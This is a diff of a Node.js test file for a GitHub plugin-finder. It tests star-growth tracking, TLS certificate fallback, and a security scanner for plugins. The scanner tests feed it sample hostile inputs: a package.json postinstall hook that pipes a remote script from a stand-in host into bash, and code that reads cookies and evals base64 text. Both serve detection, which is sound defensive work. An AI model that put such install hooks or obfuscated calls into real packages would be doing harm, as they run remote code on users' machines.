@@ -28,6 +28,12 @@ const { Store, getStore, resetStoreForTests } = await import('../lib/store.mjs')
 const { runSearch, requestBudget } = await import('../lib/search.mjs')
 const { createHandlers } = await import('../lib/routes.mjs')
 const { GitHubClient, resetNetworkCacheForTests } = await import('../lib/github.mjs')
+const {
+  errorText, isCertificateFailure, parseCertificates, localExtraCertificates, resetTrustCacheForTests, request, HttpError,
+} = await import('../lib/util.mjs')
+const { growth7d, WEEK_MS } = await import('../lib/store.mjs')
+const { scanText, summarize } = await import('../lib/security.mjs')
+const { rootCertificates } = await import('node:tls')
 
 /** A fresh index *and* a fresh query-page cache, so mocks are consulted. */
 function resetAll() {
@@ -416,6 +422,117 @@ test('seed cards match names only and stay marked', () => {
   assert.equal(store.seedCards(parseIntent(''), 10).length, 0)
 })
 
+test('star history yields weekly growth and a hot list above the threshold', () => {
+  const store = new Store()
+  store.upsert([{ full_name: 'hot/plugin-a', desc: 'a', stars: 60, topics: ['dsh-plugin'] }, { full_name: 'cold/plugin-b', desc: 'b', stars: 5, topics: ['dsh-plugin'] }])
+  const now = Date.now()
+  const a = store.lookup('hot/plugin-a')
+  a.sh = [{ t: now - WEEK_MS - 3600000, s: 8 }, { t: now - 3600000, s: 60 }]
+  const b = store.lookup('cold/plugin-b')
+  b.sh = [{ t: now - WEEK_MS - 3600000, s: 5 }]
+  const growthA = growth7d(a, now)
+  assert.equal(growthA.delta, 52)
+  assert.equal(growthA.estimated, false)
+  assert.equal(growth7d(b, now).delta, 0)
+  const hot = store.hotThisWeek({ minGrowth: 50, windowDays: 7 })
+  assert.deepEqual(hot.items.map((card) => card.full_name), ['hot/plugin-a'])
+  assert.equal(hot.items[0].growth.delta, 52)
+})
+
+test('growth without a full window is honest about estimation', () => {
+  const now = Date.now()
+  const young = { full_name: 'a/young', s: 80, sh: [{ t: now - 86400000, s: 20 }], c: new Date(now - 2 * 86400000).toISOString() }
+  const growth = growth7d(young, now)
+  assert.equal(growth.estimated, true)
+  assert.equal(growth.delta, 60)
+  const fresh = { full_name: 'a/fresh', s: 80, sh: [], c: new Date(now - 2 * 86400000).toISOString() }
+  assert.equal(growth7d(fresh, now).delta, 80)
+})
+
+test('upsert appends star snapshots and tolerates repeats', () => {
+  const store = new Store()
+  store.upsert([{ full_name: 'x/y', stars: 10 }])
+  const first = store.lookup('x/y').sh.length
+  store.upsert([{ full_name: 'x/y', stars: 10 }])
+  assert.equal(store.lookup('x/y').sh.length, first, 'an unchanged count right after the first snapshot adds nothing')
+  store.upsert([{ full_name: 'x/y', stars: 12 }])
+  assert.equal(store.lookup('x/y').sh[store.lookup('x/y').sh.length - 1].s, 12)
+})
+
+console.log('tls fallback plumbing')
+
+test('certificate failures are detected through the error chain', () => {
+  const failure = new Error('fetch failed', { cause: Object.assign(new Error('unable to verify the first certificate'), { code: 'UNABLE_TO_VERIFY_LEAF_SIGNATURE' }) })
+  assert.equal(isCertificateFailure(failure), true)
+  assert.ok(errorText(failure).includes('UNABLE_TO_VERIFY_LEAF_SIGNATURE'))
+  assert.equal(isCertificateFailure(new Error('ECONNRESET')), false)
+})
+
+test('PEM parsing keeps valid certificates and drops junk', () => {
+  const pem = rootCertificates[0]
+  assert.equal(parseCertificates(pem).length, 1)
+  const two = pem + '\n' + pem
+  assert.equal(parseCertificates(two).length, 1, 'duplicates collapse')
+  assert.equal(parseCertificates('-----BEGIN CERTIFICATE-----\nnope\n-----END CERTIFICATE-----').length, 0)
+  assert.equal(parseCertificates('').length, 0)
+})
+
+test('local CA files are optional and tolerated', () => {
+  resetTrustCacheForTests()
+  const certificates = localExtraCertificates()
+  assert.ok(Array.isArray(certificates))
+})
+
+await testAsync('request surfaces the real cause when even the fallback cannot connect', async () => {
+  const real = globalThis.fetch
+  globalThis.fetch = async () => { throw new Error('fetch failed', { cause: Object.assign(new Error('self-signed certificate'), { code: 'DEPTH_ZERO_SELF_SIGNED_CERT' }) }) }
+  try {
+    await request('https://no-such-host.invalid/x')
+    assert.fail('request must throw')
+  } catch (error) {
+    assert.ok(error instanceof HttpError, `unexpected error: ${error && error.name}: ${error && error.message}`)
+    assert.equal(error.kind, 'network')
+    assert.ok(/fetch failed/.test(error.message) && /self-signed certificate/.test(error.message), `message was: ${error.message}`)
+  } finally {
+    globalThis.fetch = real
+  }
+})
+
+console.log('security scan')
+
+test('privacy capabilities are detected in README and code', () => {
+  const readme = scanText('This plugin reads your 剪贴板 and 识屏 to react quickly.', 'readme')
+  const ids = readme.map((finding) => finding.id)
+  assert.ok(ids.includes('clipboard'))
+  assert.ok(ids.includes('screen'))
+  const code = scanText('const value = document.cookie; const t = eval(atob("YWJj"))', 'code')
+  assert.ok(code.some((finding) => finding.id === 'browser-data'))
+  assert.ok(code.some((finding) => finding.id === 'obfuscated'))
+})
+
+test('install scripts and credential handling escalate to high', () => {
+  const pkg = scanText('{"scripts":{"postinstall":"curl https://x.sh | bash"}}', 'package')
+  assert.equal(pkg[0].id, 'install-script')
+  const verdict = summarize([...pkg, { id: 'credentials', severity: 'high', label: { zh: 'x', en: 'x' } }])
+  assert.equal(verdict.level, 'high')
+  assert.ok(verdict.findings.length >= 1)
+})
+
+test('a clean README stays clear and unremarkable', () => {
+  const verdict = summarize(scanText('A plugin that renders a clock widget.', 'readme'))
+  assert.equal(verdict.level, 'clear')
+  assert.equal(verdict.findings.length, 0)
+})
+
+test('findings are deduped and a high match wins', () => {
+  const verdict = summarize([
+    { id: 'telemetry', severity: 'warn', label: { zh: 'a', en: 'a' } },
+    { id: 'telemetry', severity: 'high', label: { zh: 'b', en: 'b' } },
+  ])
+  assert.equal(verdict.level, 'high')
+  assert.equal(verdict.findings.filter((finding) => finding.id === 'telemetry').length, 1)
+})
+
 console.log('search orchestration (mocked network)')
 
 const realFetch = globalThis.fetch
@@ -632,6 +749,58 @@ await testAsync('translate handler rejects oversized bodies', async () => {
   assert.equal(res.status, 400)
 })
 
+await testAsync('hot handler answers from the star-history index', async () => {
+  resetAll()
+  const store = getStore()
+  store.upsert([{ full_name: 'hot/plugin-a', stars: 70, topics: ['dsh-plugin'] }])
+  const now = Date.now()
+  store.lookup('hot/plugin-a').sh = [{ t: now - WEEK_MS - 1000, s: 10 }, { t: now, s: 70 }]
+  const handlers = createHandlers({ translator: new Translator({ cacheFile: path.join(tmp, 'route-cache3.json') }) })
+  const res = fakeResponse()
+  await handlers['/github-plugin-finder/hot'](fakeRequest({ minGrowth: 50 }), res)
+  const payload = res.body()
+  assert.equal(payload.ok, true)
+  assert.deepEqual(payload.items.map((card) => card.full_name), ['hot/plugin-a'])
+  assert.equal(payload.items[0].growth.delta, 60)
+})
+
+await testAsync('scan handler reads public files and caches the verdict', async () => {
+  resetAll()
+  installMockFetch([
+    ['/repos/o/plugin/readme', 'This plugin uses your 剪贴板.'],
+    ['/repos/o/plugin/contents/package.json', { name: 'p', scripts: { postinstall: 'curl https://x.sh | bash' } }],
+  ])
+  try {
+    const handlers = createHandlers({ translator: new Translator({ cacheFile: path.join(tmp, 'route-cache4.json') }) })
+    const first = fakeResponse()
+    await handlers['/github-plugin-finder/scan'](fakeRequest({ repos: ['o/plugin'] }), first)
+    const payload = first.body()
+    assert.equal(payload.ok, true)
+    assert.equal(payload.results['o/plugin'].level, 'high')
+    const second = fakeResponse()
+    await handlers['/github-plugin-finder/scan'](fakeRequest({ repos: ['o/plugin'] }), second)
+    assert.equal(second.body().results['o/plugin'].level, 'high')
+  } finally {
+    uninstallMockFetch()
+  }
+})
+
+await testAsync('hot and scan routes are registered with the host entry', async () => {
+  resetAll()
+  const plugin = await import('../index.js')
+  const routes = new Map()
+  const ctx = {
+    webServer: { register(route) { routes.set(route.path, route); return () => {} } },
+    effect(fn) { fn() },
+  }
+  plugin.apply({
+    inject(services, callback) { callback(ctx) },
+    effect() {},
+  })
+  assert.ok(routes.get('/github-plugin-finder/hot'), 'hot route is registered')
+  assert.ok(routes.get('/github-plugin-finder/scan'), 'scan route is registered')
+})
+
 await testAsync('host entry registers its routes on the web server', async () => {
   resetAll()
   const plugin = await import('../index.js')
@@ -647,7 +816,7 @@ await testAsync('host entry registers its routes on the web server', async () =>
     },
     effect() {},
   })
-  assert.equal(routes.size, 4)
+  assert.equal(routes.size, 6)
   const health = routes.get('/github-plugin-finder/health')
   assert.ok(health, 'health route is registered')
   const res = fakeResponse()
